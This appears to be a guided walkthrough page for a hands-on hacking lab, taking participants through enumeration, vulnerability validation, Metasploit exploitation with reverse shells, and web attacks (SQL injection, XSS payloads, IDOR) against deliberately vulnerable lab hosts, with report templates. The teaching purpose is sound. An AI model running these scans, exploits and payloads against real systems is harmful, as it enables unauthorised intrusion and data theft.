The Hidden Chamber · Guided Missions

Work the Chamber, Step by Step

Pick your depth and get a full walkthrough, discover → enumerate → validate → report, with the exact tools to run and how to write up what you find. The write-up is the real deliverable; the tools just get you the evidence.

  1. The Chamber
  2. Guided missions

Before any tier

Scope: only the target a volunteer points you to, 10.50.70.52 (Linux) or 10.50.70.53 (Windows). Nothing else, on the lab or anywhere. Keep Nmap timing at -T3 or lower; the boxes are shared.
  1. Set your target and a place for evidence: 
    TARGET=10.50.70.52        # or .53, whichever your challenge uses
mkdir -p ~/red-sands/evidence && cd ~/red-sands/evidence
  2. Capture everything you do. Your notes are the deliverable: 
    script -a ~/red-sands/evidence/session-$(date +%H%M).log   # records your whole terminal
    (type exit to stop recording.) Or append single outputs with | tee -a notes.txt.
  3. Confirm you can reach the target and nothing else: ping -c2 "$TARGET"

Pick your mission

Three depth tiers against the Metasploitable hosts (10.50.70.52 / .53), start at the Outer Chamber even if you’re experienced, it feeds the deeper tiers, plus a web-exploitation track against the Hackazon app.

Initiate~15 min

The Outer Chamber: Enumerate & inspect

Goal: learn the target without changing it. You’ll finish with one service, its version, and one thing it exposes that it shouldn’t. No exploitation at this tier.

Deeper on the scanning here → Nmap & NSE reference.

Phase 1 · Discover

What’s actually here?

Run a service + version scan and let the default scripts add detail:

nmap -sV -sC -T3 --top-ports 100 -oN nmap_$TARGET.txt "$TARGET"

-sV = ask each service to identify itself · -sC = safe default scripts · -oN saves the output as evidence. Read it top to bottom; note every open port and the product/version.

Optional: see what else is alive on the lab segment first with a layer-2 sweep, sudo netdiscover -r 10.50.70.0/24 or sudo arp-scan --localnet. (Your target is already given, so this is for the habit, not the hunt.)

Phase 2 · Enumerate

Look closer at one or two services

Pick services from your scan and inspect them without logging in to anything you shouldn’t:

# FTP (port 21) - is anonymous login allowed?
nmap --script ftp-anon -p21 "$TARGET"

# SMB (port 445) - list shares, then map what each one allows
smbclient -L //"$TARGET" -N
enum4linux-ng -A "$TARGET" | tee smb_$TARGET.txt
smbmap -H "$TARGET"                       # READ/WRITE per share, at a glance

# Web (port 80 / 8080 / 8585 / …) - identify, then look deeper
whatweb http://"$TARGET"/                 # app + version
curl -sI http://"$TARGET"/                # headers
nikto -host http://"$TARGET"/ | tee nikto_$TARGET.txt   # quick misconfig sweep
gobuster dir -u http://"$TARGET"/ -w /usr/share/wordlists/dirb/common.txt   # hidden paths
wpscan --url http://"$TARGET":8585/       # if it's WordPress

# SNMP (udp 161), if open - often wide open on lab boxes
onesixtyone "$TARGET" public
snmpwalk -v2c -c public "$TARGET" | head

# Any port - just talk to it and read the banner
nc -nv "$TARGET" 21

You’re reading what each service volunteers about itself. That habit is the whole point of this tier. Pick one or two services; you don’t need to run every line.

Keep it gentle on shared boxes: one content scan at a time, default threads. nikto and gobuster are noisy, let a volunteer know before you fan out.
Phase 3 · Report

Write one clean finding

Pick the single most interesting thing and write it up (template at the bottom of this page). A worked example:

Observation
Anonymous FTP is enabled on 10.50.70.52:21 (ProFTPD). Logged in as anonymous with any password and listed files.
Evidence
nmap --script ftp-anon reports “Anonymous FTP login allowed”; directory listing captured in nmap_10.50.70.52.txt.
Impact
Anyone on the network can read whatever is shared, no credentials needed.
Remediation
Disable anonymous FTP, or require authentication and restrict the shared directory.

Tools for capturing and writing this up → Document & Report.

Done? Show a volunteer your finding and keep your scan output, the Inner Chamber starts from it.
Scribe~25 min

The Inner Chamber: Validate a weakness

Goal: confirm, don’t just suspect, a known weakness on a service you enumerated. You’ll prove it safely, without exploiting it.

Deeper on the framework here → Metasploit reference.

Phase 1 · Discover / Enumerate

Pick a service with a known issue

From your Outer-Chamber scan, choose a service that tends to carry well-known flaws:

  • Linux (10.50.70.52): the web CMS (e.g. Drupal), the FTP daemon, or a database.
  • Windows (10.50.70.53): Jenkins, the Tomcat manager, or Elasticsearch.
Phase 2 · Research

Match the version to a known weakness

searchsploit <product> <version>        # e.g. searchsploit drupal 7
# or read the version straight from the service:
curl -s http://"$TARGET":9200/            # Elasticsearch - version in the JSON
curl -s http://"$TARGET"/CHANGELOG.txt    # Drupal/CMS - version at the top

Write down the CVE or advisory you think applies. You’re about to confirm it.

Phase 3 · Validate (safely)

Confirm it with check, not run

Metasploit modules have a check action that confirms a target is vulnerable without exploiting it:

msfconsole -q
search <product>
use <module>
set RHOSTS "$TARGET"
check            # ← stop here at this tier; read what it reports

Some weaknesses have a dedicated, non-destructive Nmap script that confirms them without Metasploit at all:

nmap --script vuln -p <port> "$TARGET"             # safe vuln-detection scripts
nmap --script smb-vuln-ms17-010 -p445 "$TARGET"   # e.g. EternalBlue - detection only

Weak credentials? If you suspect a default or weak login, confirm it gently and only with a volunteer’s OK, a tiny, targeted wordlist, never a full brute force on a shared box:
hydra -l admin -P /usr/share/wordlists/small.txt ftp://"$TARGET" -t 2 -f

Only check / detect at this tier. Never run a module whose check you haven’t read, and modules (or credential attacks) that can crash or lock out a service are volunteer-demo only.
Phase 4 · Report

Write the validated finding

Observation
Elasticsearch on 10.50.70.53:9200 reports version 1.1.1, affected by CVE-2014-3120.
Evidence
curl :9200/ shows the version; Metasploit check returns “The target appears to be vulnerable.”
Impact
An attacker could run code on the server via the vulnerable scripting feature.
Remediation
Upgrade Elasticsearch to a fixed release; disable dynamic scripting; restrict network access to the service.

Tools for capturing and writing this up → Document & Report.

Done? Walk a volunteer through your validation evidence. If you’re cleared to go further, continue to the Burial Chamber.
High Priest~35 min

The Burial Chamber: Gain access & recover the relic

Goal: turn a validated finding into access on an approved service, then capture that service's flag, a hidden playing card. The full write-up, discovery to access, is the deliverable.

Deeper on sessions & Meterpreter → Metasploit reference.

Get the green light first. Confirm the exact service with a volunteer. MS17-010 (EternalBlue) and any memory-corruption exploit can crash the shared target, those are volunteer demo only, never run against the live lab host.
Phase 1 · Set up the exploit

Point the validated module at the target

First find your own IP on the attendee network, reverse shells come back to this address:

ip -br address        # your 10.50.60.x address = LHOST
msfconsole -q
use <the module you validated in the Inner Chamber>
set RHOSTS "$TARGET"
set LHOST  <your 10.50.60.x address>
set LPORT  4444
check                  # confirm one more time before you run
Phase 2 · Gain access

Run it and catch the session

run            # opens a session if it lands
# then, in the session:
getuid         # (meterpreter) who am I on the target?
sysinfo        # (meterpreter) what host is this?

If you get a raw shell instead of meterpreter, use whoami / id and hostname.

Phase 3 · Recover the relic

Capture the card flag

Each service hides a flag, a playing card. With access, track down the card tied to the service you exploited. Some sit in a folder; many are tucked inside another file (an image, document, capture, or database) and need a quick extraction.

# look where you landed and in the usual spots
ls -la ; find / -iname '*_of_*' 2>/dev/null     # Linux
dir /s                                          # Windows

# if a file won't open, the card is hidden inside it - carve it out:
binwalk <file>        # spot embedded data
foremost <file>       # recover an embedded image

A file that won’t display is the puzzle, the card usually has to be extracted or decoded. A volunteer holds the card list and will point you to the right one and confirm your capture.

Phase 4 · Report

Document the whole path

Your write-up should let someone reproduce the entire route: the service you chose and why, the version/CVE, the check result, the module and options you set, the session you got, and the flag. Use the template below.

Tools for capturing and writing this up → Document & Report.

When you’re finished, ask a volunteer to reset the target so the next person starts clean. No persistence, no changes left behind.
Scribe → High Priest~30 min

The Web App: Hackazon

Hackazon is the deliberately vulnerable online shop you inspected at the Scribe’s Arsenal. Here you go further, find, confirm, and demonstrate a real web vulnerability, then write it up. There’s no card flag on this one; your evidence of a working exploit is the prize.

Deeper on the proxy workflow → Burp Suite reference.

Scope: only the lab Hackazon URL a volunteer gives you (http://<hackazon>/). Don’t point web tools at anything else. Keep automated tools gentle on the shared app (few threads, modest --level/--risk), and don’t wipe or corrupt its data.
Phase 1 · Map the app

See everything it does

Browse the shop with Burp (Community) in the loop so every request is recorded, log in, search, open a product, add to cart, view your profile and orders.

# point the browser at Burp's proxy (127.0.0.1:8080), then walk the whole app.
# Burp → Target → Site map fills in as you click. Note every input:
#   search box · product/category id in the URL · login · cart · profile / order ids · any /api endpoints
Phase 2 · Pick an input to test

Where does your input reach the app?

From the site map, list the spots where your input is reflected on the page, used in a lookup, or names an object by id. Good first targets: the search term, a product/category id parameter, the login form, and any order/profile id.

Phase 3 · Find & confirm a vulnerability

Try one of these classes

SQL injection, on a parameter such as a product/category id:

# manual: does a quote break it, and does a true/false pair change the result?
#   ...?id=1'                         → error or a different page
#   ...?id=1 AND 1=1   vs   ...?id=1 AND 1=2
# then confirm/enumerate with sqlmap - scoped to the one URL and kept gentle:
sqlmap -u "http://<hackazon>/...?id=1" --batch --level=2 --risk=1 --threads=2 --dbs

Tip: try the id in the URL and the search box first, but the filter and sort parameters and any /api endpoint are injectable too. If a scanner finds nothing, that’s expected, Hackazon resists naive scanning, so test by hand. Let sqlmap confirm what your quote-and-boolean test already suggested, rather than firing it blind.

Cross-site scripting (XSS), on a reflected input like the search box or a review field:

# inject a harmless proof payload and see whether it runs:
#   <script>alert(1)</script>      or      <img src=x onerror=alert(1)>
# reflected = it fires on your own result page · stored = it fires for anyone who views it later

Tip: the search box is the quick reflected win. For a stored one, drop the payload in a product review or a profile field, then reload the page as a fresh visit, if it fires without you re-submitting, it’s stored, which is the higher-impact finding. If angle brackets get stripped, try an attribute-breakout like " onmouseover=alert(1) x=".

IDOR / broken access control, on a request that names an object by id:

# in Burp Repeater, take a request for YOUR order/profile and change the id:
#   GET /account/order?id=1001   →   id=1002
# if you can read (or change) someone else's record, that's broken access control.

Tip: make two accounts (or note another attendee’s order id) so you have a “someone else” to reach. Increment or decrement the id and watch the response, another user’s name, address, or order means you’re in. The same trick applies to wishlists and cart items, not just orders.

Other classes worth a look, if you want to push further:

  • Parameter tampering, in Burp, change a price or quantity in the add-to-cart / checkout request and see whether the app trusts it.
  • CSRF, check a state-changing form (profile update, add-to-cart): if the request carries no unpredictable token, it’s forgeable.
  • Open redirect, look for a redirect / return-URL parameter that will bounce you to an outside address.
  • API surface, the REST/SOAP endpoints are their own attack surface; the same injection and access-control ideas apply there, often with less input filtering.
Confirm before you claim it: a real finding means you can show the effect, data returned, the alert firing, another user’s record, and you’ve captured the request and response as evidence.
Phase 4 · Report

Write it up

Document each finding with the four-part structure below. Name the class. It maps to the OWASP Top 10 (Injection, XSS, Broken Access Control), paste the request/response that proves it, state the real-world impact, and give the fix (parameterized queries, output encoding, server-side authorization checks). A volunteer verifies your evidence.

Tools for capturing and writing this up → Document & Report.

How to document every finding

Whatever tier you reach, a finding has the same four parts. This is what separates “I ran a tool” from “I found something.”

Observation

What you saw: target, service, port, timestamp, and the command plus the relevant output.

Evidence

The single piece of proof behind your conclusion. Could another tester reproduce it from your notes?

Impact

What an attacker could realistically do if this existed in a real environment.

Remediation

The patch, version upgrade, config change, or compensating control that reduces the risk.

Keep the raw output in ~/red-sands/evidence/ (that’s what script and tee were for). Good evidence is reproducible, timestamped, and points at one clear conclusion.
